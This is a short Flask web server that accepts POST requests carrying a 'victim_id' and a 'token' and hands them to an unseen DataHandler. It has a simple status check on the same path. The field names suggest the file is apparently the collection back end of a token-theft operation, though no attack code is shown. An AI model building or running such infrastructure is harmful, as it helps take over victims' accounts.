from flask import Flask, request
import json
from source.data_workers.data_handler import DataHandler

import logging

app = Flask(__name__)


@app.route('/gpl', methods=['POST'])
def handler():
    logger = logging.getLogger("WebServer")
    try:
        data = json.loads(request.data.decode())
        if data.get('victim_id') and data.get('token'):
            _resp = DataHandler(data['victim_id'], data['token']).handler()
            if not _resp:
                raise SystemError("Got bad output")
            return _resp
    except Exception as e:
        logger.error(str(e))
        return 'Bad data passed.', 400


@app.route('/gpl', methods=['GET'])
def status():
    return 'ok', 200
